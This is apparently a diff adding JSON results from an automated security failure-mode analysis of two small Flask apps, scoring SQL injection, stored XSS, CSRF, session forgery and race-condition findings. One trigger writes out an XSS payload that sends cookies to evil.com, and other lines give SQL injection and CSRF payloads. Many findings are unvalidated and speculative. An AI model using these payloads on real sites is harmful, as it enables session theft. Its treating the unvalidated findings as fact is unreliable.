+              "business_impact": "Unauthorized access to all endpoints, enabling fraudulent refunds, data exfiltration, and full system control. Business suffers financial loss, operational disruption, and regulatory penalties.",
+              "blast_radius": "All authentication mechanisms (current_user()) and endpoints (/orders/search, /admin/refund) are compromised. Enables lateral movement if adjacent systems trust this service's auth.",
+              "attack_chain": [
+                "Attacker gains access to JWT_SECRET from config.py (e.g., via source code leak, misconfiguration, or insider threat)",
+                "Attacker crafts a JWT token with arbitrary claims (e.g., admin privileges) using the stolen secret",
+                "Token is sent in Authorization header to /admin/refund or /orders/search",
+                "current_user() (path:app.py:17-22) validates the token using the compromised secret, granting unauthorized access"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Unauthorized Refunds via Missing Input Validation in /admin/refund",
+              "trigger": "A POST request to /admin/refund with a JSON body containing arbitrary amount and order_id values (e.g., {\"amount\": -1000, \"order_id\": \"1 OR 1=1\"}).",
+              "evidence": "path:app.py:41-43: body = request.get_json(); db().execute(\"UPDATE orders SET refunded = ? WHERE id = ?\", (body[\"amount\"], body[\"order_id\"]))",
+              "business_impact": "Financial fraud via unauthorized refunds. Business loses revenue, and customers may be incorrectly charged or refunded. Operational staff must manually reconcile fraudulent transactions.",
+              "blast_radius": "Direct financial impact on the business. If order_id is manipulated, could affect multiple customers. No lateral movement, but repeated exploitation can drain funds.",
+              "attack_chain": [
+                "Attacker (with valid JWT token, e.g., stolen or self-signed with compromised secret) sends POST to /admin/refund",
+                "Request body contains arbitrary amount and order_id (e.g., {\"amount\": 999999, \"order_id\": 1})",
+                "No validation on body fields at path:app.py:41-43; SQL query executes with attacker-controlled values",
+                "Database is updated to mark the order as refunded with the attacker-specified amount, bypassing business logic"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 6,
+              "rpn": 378,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Information Disclosure via Stack Traces in Error Handler",
+              "trigger": "Any request causing an unhandled exception (e.g., /orders/search?q=test' --, /admin/refund with missing fields).",
+              "evidence": "path:app.py:51-52: return jsonify(error=str(exc), trace=traceback.format_exc()), 500",
+              "business_impact": "Exposure of sensitive implementation details aids further attacks (e.g., SQLi, auth bypass). Attackers gain reconnaissance data to refine exploits. Business faces increased risk of successful breaches.",
+              "blast_radius": "All endpoints share the same error handler; any unhandled exception in Tier 1 components leaks info. No direct data exfiltration, but enables follow-on attacks.",
+              "attack_chain": [
+                "Attacker sends a malformed request (e.g., invalid JSON, SQL syntax error) to any endpoint",
+                "An exception is raised (e.g., SQLite syntax error, KeyError for missing JSON fields)",
+                "The on_error handler (path:app.py:49-52) catches the exception and returns the full stack trace in the response",
+                "Stack trace reveals internal details: file paths, SQL queries, JWT_SECRET usage, and code structure"
+              ],
+              "severity": 8,
+              "occurrence": 8,
+              "detection": 5,
+              "rpn": 320,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Race Condition in DB Connection Leading to Data Corruption",
+              "trigger": "High concurrency of write operations (e.g., multiple /admin/refund requests in quick succession).",
+              "evidence": "path:app.py:10-14: def db(): if \"db\" not in g: g.db = sqlite3.connect(DB_PATH)",
+              "business_impact": "Data corruption in order/refund records leads to financial discrepancies, customer disputes, and manual reconciliation. Business faces operational downtime and reputational harm.",
+              "blast_radius": "Entire SQLite database (shop.db) may become corrupted, affecting all Tier 1 data. Requires DB restoration from backups, causing downtime.",
+              "attack_chain": [
+                "Multiple concurrent requests hit /admin/refund or /orders/search",
+                "The db() function (path:app.py:10-14) uses Flask's g object to store the SQLite connection per-request",
+                "SQLite does not support high concurrency; concurrent writes can corrupt the database file (shop.db)",
+                "If two refunds for the same order_id are processed simultaneously, the final state may be inconsistent (e.g., double refund)"
+              ],
+              "severity": 8,
+              "occurrence": 6,
+              "detection": 9,
+              "rpn": 432,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Direct SQLite DB File Access Bypassing Application Logic",
+              "trigger": "Filesystem access to shop.db (e.g., via SSH, container volume mounts, or backup leaks).",
+              "evidence": "path:config.py:1: DB_PATH = \"shop.db\"; path:app.py:12: g.db = sqlite3.connect(DB_PATH)",
+              "business_impact": "Complete bypass of all security controls. Attackers can steal PII, manipulate financial records, or delete data. Business faces catastrophic data loss and compliance violations.",
+              "blast_radius": "Full compromise of Tier 1 data (all orders, refunds, customer PII). If the DB file is on shared storage, adjacent systems may also be at risk.",
+              "attack_chain": [
+                "Attacker gains filesystem access to the server (e.g., via misconfigured permissions, container escape, or insider threat)",
+                "Attacker directly reads or modifies shop.db (path:config.py:1: DB_PATH = \"shop.db\")",
+                "Bypasses all application-layer controls (JWT auth, input validation, logging)",
+                "Exfiltrates or alters order data, including card tokens and refund statuses"
+              ],
+              "severity": 10,
+              "occurrence": 5,
+              "detection": 9,
+              "rpn": 450,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service via Flask App Crash on Malformed Input",
+              "trigger": "A request with an invalid JWT token (e.g., tampered or empty) to any authenticated endpoint.",
+              "evidence": "path:app.py:19-22: try: return jwt.decode(...) except jwt.PyJWTError: return None; path:app.py:49-52: @app.errorhandler(Exception)",
+              "business_impact": "Service outage affects all customers and staff. Business loses revenue during downtime and faces reputational damage.",
+              "blast_radius": "All Tier 1 endpoints (/orders/search, /admin/refund) are taken down. No data loss, but full operational disruption.",
+              "attack_chain": [
+                "Attacker sends a request with a malformed JWT token (e.g., invalid signature) to /orders/search or /admin/refund",
+                "current_user() (path:app.py:19-22) raises a jwt.PyJWTError, but the exception is not caught in the endpoint",
+                "The unhandled exception propagates to on_error (path:app.py:49-52), which returns a 500 error",
+                "If the error handler itself fails (e.g., due to traceback formatting issues), the Flask app may crash entirely",
+                "All endpoints become unavailable until the app is restarted"
+              ],
+              "severity": 7,
+              "occurrence": 7,
+              "detection": 4,
+              "rpn": 196,
+              "priority": "Medium",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.187944,
+          "seconds": 117.3,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "SQL Injection via /orders/search leading to full database compromise",
+              "trigger": "A single HTTP GET request to /orders/search with a maliciously crafted 'q' parameter containing SQL injection syntax.",
+              "evidence": "app.py:32: f\"SELECT id, email, card_token, total FROM orders WHERE email LIKE '%{term}%'\"",
+              "business_impact": "Complete exposure of customer PII (emails) and payment data (card tokens), violating PCI-DSS and GDPR. Loss of customer trust, regulatory fines, and potential legal liability. All business operations relying on order data are compromised.",
+              "blast_radius": "Entire SQLite database (shop.db) is exposed. Compromise affects all Tier 1 components (orders, refunds, auth). Enables lateral movement if card tokens can be used elsewhere.",
+              "attack_chain": [
+                "Attacker sends crafted GET request to /orders/search with q parameter containing SQL injection payload (e.g., q=' OR 1=1 --)",
+                "The payload is directly interpolated into the SQL query at app.py:32",
+                "The malicious query executes with the privileges of the SQLite database connection, allowing extraction of all data (emails, card tokens, order details)",
+                "Attacker exfiltrates sensitive data or modifies/deletes records"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 8,
+              "rpn": 640,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "JWT Secret Leak via Error Handler leading to full authentication bypass",
+              "trigger": "Any request that causes an unhandled exception (e.g., invalid JSON in /admin/refund, SQL syntax error in /orders/search).",
+              "evidence": "app.py:51-52: return jsonify(error=str(exc), trace=traceback.format_exc()), 500",
+              "business_impact": "Complete authentication bypass. Attackers can impersonate any user (including admins), issue fraudulent refunds, and access all customer data. Financial loss and reputational damage.",
+              "blast_radius": "All JWT-protected endpoints (Tier 1) are compromised. Enables privilege escalation to admin functions.",
+              "attack_chain": [
+                "Attacker triggers an exception (e.g., malformed request to /orders/search or /admin/refund)",
+                "The on_error handler at app.py:50-52 catches the exception and returns a 500 response with full stack trace",
+                "Stack trace includes the JWT_SECRET from config.py (if it was used in a failed operation or is in memory)",
+                "Attacker extracts JWT_SECRET from the trace and forges arbitrary JWT tokens",
+                "Attacker gains unauthorized access to all endpoints, including /admin/refund"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Unauthorized Refund Issuance via Missing Admin Check in /admin/refund",
+              "trigger": "A POST request to /admin/refund with a valid (non-admin) JWT token and a JSON body like {\"order_id\": 123, \"amount\": 999999}.",
+              "evidence": "app.py:39-40: if not current_user(): return jsonify(error=\"unauthorised\"), 401; app.py:42-44: db().execute(\"UPDATE orders SET refunded = ? WHERE id = ?\", (body[\"amount\"], body[\"order_id\"]))",
+              "business_impact": "Direct financial loss from fraudulent refunds. Customer accounts may be debited incorrectly. Operational disruption due to reconciliation issues.",
+              "blast_radius": "Financial data in the orders table is corrupted. Affects accounting, auditing, and customer trust.",
+              "attack_chain": [
+                "Attacker obtains a valid JWT token (e.g., via phishing or JWT_SECRET leak)",
+                "Attacker sends POST request to /admin/refund with a JSON body containing arbitrary order_id and amount",
+                "The endpoint only checks for a valid JWT (app.py:39-40) but does NOT verify admin privileges",
+                "The refund is processed unconditionally (app.py:42-44), deducting funds from the business",
+                "Attacker repeats this to drain funds or target specific orders"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 6,
+              "rpn": 378,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Race Condition in Refund Processing leading to Double Refund",
+              "trigger": "Two or more concurrent POST requests to /admin/refund with the same order_id within a short time window.",
+              "evidence": "app.py:42-45: db().execute(\"UPDATE orders SET refunded = ? WHERE id = ?\", (body[\"amount\"], body[\"order_id\"])); db().commit()",
+              "business_impact": "Financial loss from double refunds. Accounting discrepancies and potential chargebacks. Operational overhead to detect and correct errors.",
+              "blast_radius": "Affects the orders table in shop.db. May require manual intervention to fix. No direct data leak, but financial integrity is compromised.",
+              "attack_chain": [
+                "Attacker (or malicious insider) sends two concurrent POST requests to /admin/refund for the same order_id with the same or different amounts",
+                "Both requests pass the current_user() check (app.py:39-40) and reach the UPDATE statement (app.py:42-44)",
+                "Due to lack of transaction isolation (SQLite default is AUTOCOMMIT), both updates may succeed if the order_id is not locked",
+                "The order is refunded twice, causing financial loss equal to the duplicate amount"
+              ],
+              "severity": 8,
+              "occurrence": 6,
+              "detection": 9,
+              "rpn": 432,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Arbitrary File Write via DB_PATH Manipulation leading to Remote Code Execution",
+              "trigger": "Write access to config.py (e.g., via compromised CI/CD, shared filesystem, or insider).",
+              "evidence": "config.py:1: DB_PATH = \"shop.db\"; app.py:11-14: g.db = sqlite3.connect(DB_PATH)",
+              "business_impact": "Full system compromise. Attacker gains persistent access, can exfiltrate all data, modify code, or pivot to other systems. Complete loss of confidentiality, integrity, and availability.",
+              "blast_radius": "Entire server hosting the app is compromised. Enables lateral movement to adjacent systems (e.g., payment processors, internal networks).",
+              "attack_chain": [
+                "Attacker gains write access to config.py (e.g., via misconfigured deployment or insider threat)",
+                "Attacker modifies DB_PATH in config.py to point to a malicious SQLite database file (e.g., DB_PATH = \"/tmp/malicious.db\")",
+                "On next request, db() in app.py:11-14 connects to the attacker-controlled database",
+                "Attacker crafts the malicious database to exploit SQLite's ability to write arbitrary files (e.g., via .dump or ATTACH DATABASE)",
+                "Attacker writes a malicious Python file (e.g., a Flask route) to the server's filesystem",
+                "Attacker triggers execution of the malicious file (e.g., by restarting the app or via another vulnerability)"
+              ],
+              "severity": 10,
+              "occurrence": 5,
+              "detection": 7,
+              "rpn": 350,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service via Malformed JWT in current_user()",
+              "trigger": "A burst of HTTP requests with malformed JWT tokens (e.g., tokens with invalid signatures or extremely large payloads).",
+              "evidence": "app.py:18-22: token = request.headers.get(\"Authorization\", \"\").removeprefix(\"Bearer \"); return jwt.decode(token, JWT_SECRET, algorithms=[\"HS256\"])",
+              "business_impact": "Service outage for all API endpoints. Customers cannot search orders, and staff cannot process refunds. Loss of revenue and customer satisfaction.",
+              "blast_radius": "Entire Flask app (Tier 1) is affected. No data corruption, but availability is lost.",
+              "attack_chain": [
+                "Attacker sends a request with a malformed or expired JWT token in the Authorization header",
+                "current_user() at app.py:18-22 attempts to decode the token with jwt.decode()",
+                "If the token is crafted to trigger a computationally expensive operation (e.g., a very long payload or a key confusion attack), the decoding process may hang or consume excessive CPU",
+                "Multiple such requests overwhelm the Flask app, causing it to become unresponsive",
+                "Legitimate users cannot access /orders/search or /admin/refund"
+              ],
+              "severity": 7,
+              "occurrence": 8,
+              "detection": 5,
+              "rpn": 280,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Information Disclosure via Stack Traces in on_error",
+              "trigger": "Any request that causes an unhandled exception (e.g., missing 'amount' or 'order_id' in /admin/refund JSON body).",
+              "evidence": "app.py:51-52: return jsonify(error=str(exc), trace=traceback.format_exc()), 500",
+              "business_impact": "Exposure of internal system details aids attackers in further exploitation. Increases the risk of successful attacks on other components. Violates security best practices.",
+              "blast_radius": "Information leak is limited to the stack trace, but it can enable follow-on attacks against Tier 1 components.",
+              "attack_chain": [
+                "Attacker sends a request that triggers an exception (e.g., invalid JSON in /admin/refund or SQL syntax error in /orders/search)",
+                "The on_error handler at app.py:49-52 catches the exception and returns a 500 response with the full stack trace",
+                "Stack trace reveals internal details: file paths, function names, database schema, and potentially sensitive data (e.g., JWT_SECRET if it was in memory)",
+                "Attacker uses this information to craft more targeted attacks (e.g., SQL injection, path traversal)"
+              ],
+              "severity": 7,
+              "occurrence": 8,
+              "detection": 6,
+              "rpn": 336,
+              "priority": "High",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.188044,
+          "seconds": 118.8,
+          "llm_calls": 21
+        }
+      ]
+    },
+    "web-templates": {
+      "runs": [
+        {
+          "findings": [
+            {
+              "failure_mode": "Stored XSS via comment body leading to admin session hijack",
+              "trigger": "Admin visits /comments or /admin/moderate after attacker submits XSS payload in comment body.",
+              "evidence": "app.py:13 ('COMMENTS.append({\"author\": request.form[\"author\"], \"body\": request.form[\"body\"]})'), templates/comments.html:5 ('{{ c.body|safe }}'), app.py:7 ('SESSION_COOKIE_HTTPONLY = False')",
+              "business_impact": "Full admin account compromise. Attacker can delete/modify all comments, access admin-only features, and perform actions as admin. Business reputation damaged, user trust eroded.",
+              "blast_radius": "All users viewing comments are at risk; admin session compromise enables full application control. Lateral movement possible if admin has access to other systems.",
+              "attack_chain": [
+                "Attacker submits malicious comment with JavaScript payload in 'body' field via POST /comment (app.py:13)",
+                "Payload is stored unsanitized in global COMMENTS list (app.py:8,13)",
+                "Victim (admin) views /comments or /admin/moderate, triggering XSS due to |safe filter (templates/comments.html:5)",
+                "JavaScript executes in victim's browser, exfiltrating non-HttpOnly session cookie (app.py:7)",
+                "Attacker uses stolen session cookie to impersonate admin via /admin/moderate (app.py:24)"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "SECRET_KEY exposure leading to session forgery and admin impersonation",
+              "trigger": "SECRET_KEY is leaked (e.g., via environment variable exposure, container image, or logs).",
+              "evidence": "app.py:6 ('app.secret_key = os.environ[\"SECRET_KEY\"]'), app.py:24 ('if not session.get(\"is_admin\")')",
+              "business_impact": "Complete authentication bypass. Attacker can perform all admin actions (moderate, delete, etc.), leading to data corruption, unauthorized access, and potential legal liability.",
+              "blast_radius": "All session-based authentication is compromised. Every user session can be forged. If SECRET_KEY is reused across services, lateral movement to other systems is possible.",
+              "attack_chain": [
+                "Attacker gains access to SECRET_KEY environment variable (app.py:6) via logs, env dump, or misconfiguration",
+                "Uses SECRET_KEY to forge arbitrary Flask session cookies (including is_admin=True)",
+                "Bypasses session check in moderate() (app.py:24) by setting forged cookie",
+                "Gains full admin privileges without authentication"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 7,
+              "rpn": 490,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Race condition in global COMMENTS list causing data corruption or loss",
+              "trigger": "High-traffic scenario with concurrent POST /comment requests from multiple users.",
+              "evidence": "app.py:8 ('COMMENTS = []'), app.py:13 ('COMMENTS.append(...)')",
+              "business_impact": "Comment data corruption or loss. Users may see incomplete, duplicated, or garbled comments. Business reputation harmed due to unreliable service.",
+              "blast_radius": "All comments in the global list are affected. No persistence means data loss is permanent after restart.",
+              "attack_chain": [
+                "Multiple concurrent POST /comment requests (app.py:13) append to the global COMMENTS list (app.py:8)",
+                "Due to Python's GIL and lack of thread safety, concurrent modifications may corrupt the list state (e.g., partial writes, lost updates)",
+                "Subsequent GET /comments (app.py:19) or /admin/moderate (app.py:26) may render incomplete or malformed data"
+              ],
+              "severity": 8,
+              "occurrence": 6,
+              "detection": 9,
+              "rpn": 432,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "CSRF attack forcing admin to perform unintended moderation actions",
+              "trigger": "Admin visits a malicious page while authenticated, triggering a CSRF request to /admin/moderate.",
+              "evidence": "app.py:22-26 ('@app.get(\"/admin/moderate\")', 'if not session.get(\"is_admin\")')",
+              "business_impact": "Unauthorized actions performed by admin account. Comments may be deleted or modified maliciously, leading to data loss and operational disruption.",
+              "blast_radius": "All admin actions can be triggered by CSRF. If admin has broader permissions, lateral damage is possible.",
+              "attack_chain": [
+                "Attacker crafts a malicious link or form targeting /admin/moderate (app.py:22) with hidden parameters",
+                "Admin (logged in via session cookie) clicks the link or submits the form unknowingly",
+                "Due to no CSRF protection (app.py:24), the request is processed as legitimate",
+                "Admin's session is used to perform actions (e.g., delete comments) without their consent"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Session fixation enabling privilege escalation to admin",
+              "trigger": "User accepts a session ID from an attacker (e.g., via phishing link) before authentication.",
+              "evidence": "app.py:24 ('if not session.get(\"is_admin\")'), app.py:7 ('SESSION_COOKIE_HTTPONLY = False')",
+              "business_impact": "Unauthorized admin access. Attacker can perform all admin actions, leading to data tampering and service abuse.",
+              "blast_radius": "All sessions are vulnerable to fixation. If admin privileges are assigned to the fixed session, full compromise occurs.",
+              "attack_chain": [
+                "Attacker sets a known session ID in a user's browser (e.g., via a malicious link with ?session=attacker_known_id)",
+                "User logs in (if login exists) or interacts with the app, adopting the attacker's session ID",
+                "If the user later gains admin privileges (e.g., via misconfiguration), the attacker's session ID now has admin access",
+                "Attacker uses the fixed session ID to access /admin/moderate (app.py:24)"
+              ],
+              "severity": 9,
+              "occurrence": 6,
+              "detection": 8,
+              "rpn": 432,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service (DoS) via memory exhaustion from unbounded COMMENTS list",
+              "trigger": "Attacker sends rapid, repeated POST /comment requests with large payloads.",
+              "evidence": "app.py:8 ('COMMENTS = []'), app.py:13 ('COMMENTS.append(...)')",
+              "business_impact": "Service unavailability. Business operations halt, leading to lost revenue and customer trust. Data loss occurs on restart.",
+              "blast_radius": "Entire application becomes unresponsive. No persistence means all comments are lost permanently.",
+              "attack_chain": [
+                "Attacker submits a large number of comments via POST /comment (app.py:13)",
+                "Each comment is appended to the global COMMENTS list (app.py:8) without size limits",
+                "Memory usage grows indefinitely, eventually crashing the Flask process",
+                "All users lose access to the service until restart (which also clears all comments)"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Stored XSS via comment author field (secondary vector)",
+              "trigger": "Admin or user visits /comments or /admin/moderate after attacker submits XSS payload in author field.",
+              "evidence": "app.py:13 ('\"author\": request.form[\"author\"]'), templates/comments.html:4 ('<b>{{ c.author }}</b>')",
+              "business_impact": "User account compromise or session hijacking. Attacker can perform actions as the victim (e.g., post malicious comments). Business reputation damaged.",
+              "blast_radius": "All users viewing comments are at risk. If admin views the comment, admin session may be compromised.",
+              "attack_chain": [
+                "Attacker submits a comment with JavaScript payload in the 'author' field via POST /comment (app.py:13)",
+                "Payload is stored in COMMENTS list (app.py:8) and rendered unsanitized in comments.html (templates/comments.html:4)",
+                "Victim views /comments or /admin/moderate, triggering XSS in the author field",
+                "JavaScript executes, potentially stealing cookies or performing actions on behalf of the victim"
+              ],
+              "severity": 7,
+              "occurrence": 6,
+              "detection": 5,
+              "rpn": 210,
+              "priority": "High",
+              "validator_confidence": 0.9
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.178261,
+          "seconds": 116.0,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "Stored XSS via comment body leading to session hijacking",
+              "trigger": "A single malicious comment submission with a payload like <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script> in the body field.",
+              "evidence": "app.py:13 ('COMMENTS.append({\"author\": request.form[\"author\"], \"body\": request.form[\"body\"]})'), templates/comments.html:5 ('{{ c.body|safe }}'), app.py:7 ('SESSION_COOKIE_HTTPONLY = False')",
+              "business_impact": "All visitors and admins are at risk of account takeover. Compromised admin sessions grant full access to /admin/moderate, enabling comment censorship or defacement. Erosion of user trust and potential regulatory penalties for data exposure.",
+              "blast_radius": "All active sessions (including admin) across the entire application. Lateral movement to other systems if session cookies are reused elsewhere.",
+              "attack_chain": [
+                "Attacker submits a comment with malicious JavaScript in the 'body' field via POST /comment",
+                "The Flask app appends the unsanitized input to the in-memory COMMENTS list (app.py:13)",
+                "When any user views /comments, the template renders the comment body with |safe filter (templates/comments.html:5), executing the JS",
+                "The JS accesses the session cookie (non-HttpOnly, app.py:7) and exfiltrates it to an attacker-controlled server",
+                "Attacker uses the stolen session cookie to impersonate the victim (including admin sessions)"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 8,
+              "rpn": 640,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "Privilege escalation via session tampering (admin access bypass)",
+              "trigger": "Setting a Flask session cookie with {'is_admin': True} (e.g., using flask-unsign or manual crafting with known SECRET_KEY).",
+              "evidence": "app.py:24 ('if not session.get(\"is_admin\")'), app.py:6 ('app.secret_key = os.environ[\"SECRET_KEY\"]')",
+              "business_impact": "Unauthorized administrative access allows deletion or modification of all comments, defacement, or denial of service. Reputational damage and loss of moderation control.",
+              "blast_radius": "Full compromise of the /admin/moderate endpoint and all comments data. Potential for persistent abuse if session fixation is possible.",
+              "attack_chain": [
+                "Attacker crafts a session cookie with is_admin=true (e.g., via Flask session tampering tools)",
+                "The Flask app uses the tampered session (app.py:24 checks session.get('is_admin') without validation)",
+                "Attacker accesses /admin/moderate with the tampered session, bypassing authentication"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "SECRET_KEY exposure leading to mass session compromise",
+              "trigger": "Exposure of SECRET_KEY via environment variable leak (e.g., in logs, process listings, or misconfigured cloud metadata).",
+              "evidence": "app.py:6 ('app.secret_key = os.environ[\"SECRET_KEY\"]')",
+              "business_impact": "Complete authentication bypass for all users. Attacker can impersonate any session, including admins, leading to full system control. Business operations halt if trust in sessions is lost.",
+              "blast_radius": "All sessions (past and future) are compromised until SECRET_KEY is rotated. Potential for persistent access if key is leaked long-term.",
+              "attack_chain": [
+                "Attacker gains access to the SECRET_KEY environment variable (e.g., via env dump, logs, or misconfiguration)",
+                "Using the SECRET_KEY, attacker signs arbitrary session cookies (e.g., with is_admin=True)",
+                "Attacker replaces their session cookie with the crafted one, gaining admin privileges or hijacking other sessions"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 9,
+              "rpn": 630,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Race condition in COMMENTS list leading to comment corruption or loss",
+              "trigger": "High-traffic burst of concurrent comment submissions (e.g., automated bot spam or coordinated attack).",
+              "evidence": "app.py:8 ('COMMENTS = []'), app.py:13 ('COMMENTS.append(...)')",
+              "business_impact": "Data corruption or loss of user-submitted comments. Degraded user experience and potential loss of business-critical feedback or records.",
+              "blast_radius": "All comments in the in-memory list are at risk. No persistence means permanent loss on app restart or crash.",
+              "attack_chain": [
+                "Multiple concurrent POST /comment requests are processed by the Flask app (single-threaded but async workers may exist in production)",
+                "The in-memory COMMENTS list (app.py:8) is modified without thread-safety (no locks)",
+                "Race condition causes partial overwrites, duplicate entries, or lost comments due to non-atomic append operations"
+              ],
+              "severity": 6,
+              "occurrence": 5,
+              "detection": 8,
+              "rpn": 240,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "CSRF attack forcing unauthorized comment submission",
+              "trigger": "Victim visits a page with a hidden form like <form action='https://target/comment' method='POST'><input name='body' value='malicious'><input type='submit'></form> and auto-submits via JavaScript.",
+              "evidence": "app.py:11-14 (no CSRF protection in /comment endpoint)",
+              "business_impact": "Reputational damage from unauthorized content posted under a victim's identity. Potential legal liability if defamatory or illegal content is submitted. User trust erosion.",
+              "blast_radius": "All users are vulnerable to forced actions. Admins may also be tricked into submitting malicious comments if they visit attacker-controlled pages.",
+              "attack_chain": [
+                "Attacker hosts a malicious page with a form targeting /comment (POST) on the victim's browser",
+                "Victim (logged in or not) visits the page, and the browser submits a crafted comment (e.g., spam, defamatory content) via the victim's session",
+                "The Flask app processes the request without CSRF token validation (app.py:11-14)"
+              ],
+              "severity": 7,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 392,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service via memory exhaustion from unbounded COMMENTS list",
+              "trigger": "Automated script sending thousands of POST requests to /comment with large payloads (e.g., 1MB+ per comment).",
+              "evidence": "app.py:8 ('COMMENTS = []'), app.py:13 ('COMMENTS.append(...)')",
+              "business_impact": "Complete outage of all endpoints (/comment, /comments, /admin/moderate). Loss of availability for all users and admins. Financial impact from downtime.",
+              "blast_radius": "Entire application (Tier 1) becomes unavailable. No persistence means all comments are lost on restart.",
+              "attack_chain": [
+                "Attacker submits a large number of comments (e.g., via automated script) to POST /comment",
+                "Each comment is appended to the in-memory COMMENTS list (app.py:13) without size limits",
+                "Memory usage grows until the Flask app crashes (OOM) or becomes unresponsive"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 8,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Reflected XSS via author field in comments (if rendered unsafely)",
+              "trigger": "A comment with author=<script>alert(1)</script> submitted via /comment. Requires a template change to exploit.",
+              "evidence": "templates/comments.html:4 ('<b>{{ c.author }}</b>'), app.py:13 (author field is unsanitized)",
+              "business_impact": "Potential for future XSS if templates are modified. Current risk is low but represents a latent vulnerability.",
+              "blast_radius": "Limited to scenarios where author is rendered unsafely. Lower immediate impact but high risk if code changes.",
+              "attack_chain": [
+                "Attacker submits a comment with malicious JavaScript in the 'author' field via POST /comment",
+                "If the template ever renders c.author without escaping (currently it does not, but templates/comments.html:4 uses {{ c.author }} which is auto-escaped by Jinja2 by default)",
+                "However, if future template changes or a different endpoint renders author unsafely, XSS could occur"
+              ],
+              "severity": 4,
+              "occurrence": 3,
+              "detection": 6,
+              "rpn": 72,
+              "priority": "Medium",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.179859,
+          "seconds": 115.2,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "Stored XSS via comment body leading to admin session hijacking",
+              "trigger": "Admin visits /comments page after attacker posts a malicious comment with embedded JavaScript.",
+              "evidence": "app.py:13 ('COMMENTS.append({\"author\": request.form[\"author\"], \"body\": request.form[\"body\"]})'), comments.html:5 ('{{ c.body|safe }}'), app.py:7 ('SESSION_COOKIE_HTTPONLY = False')",
+              "business_impact": "Unauthorized administrative access to moderation functions, enabling defacement, data tampering, or further lateral movement. Harms business reputation and operational integrity.",
+              "blast_radius": "Full compromise of admin session; potential to modify/delete all comments (Tier 1 data) and perform actions as admin. May enable pivoting to other systems if admin session has broader access.",
+              "attack_chain": [
+                "Attacker submits a comment with malicious JavaScript in the 'body' field via POST /comment (app.py:13)",
+                "The comment is stored in the in-memory COMMENTS list without sanitization (app.py:13)",
+                "When any user (including admin) views /comments, the template renders the body with |safe filter (comments.html:5), executing the script",
+                "The script exfiltrates the admin's session cookie (non-HttpOnly, app.py:7) to an attacker-controlled server",
+                "Attacker uses the stolen session cookie to access /admin/moderate (app.py:24) as admin"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Session forgery via SECRET_KEY leak",
+              "trigger": "SECRET_KEY is exposed (e.g., in logs, config files, or via SSRF to metadata endpoints).",
+              "evidence": "app.py:6 ('app.secret_key = os.environ[\"SECRET_KEY\"]'), app.py:24 ('if not session.get(\"is_admin\")')",
+              "business_impact": "Complete bypass of authentication for admin functions. Enables unauthorized moderation, data manipulation, and potential system-wide compromise if admin privileges extend beyond this app.",
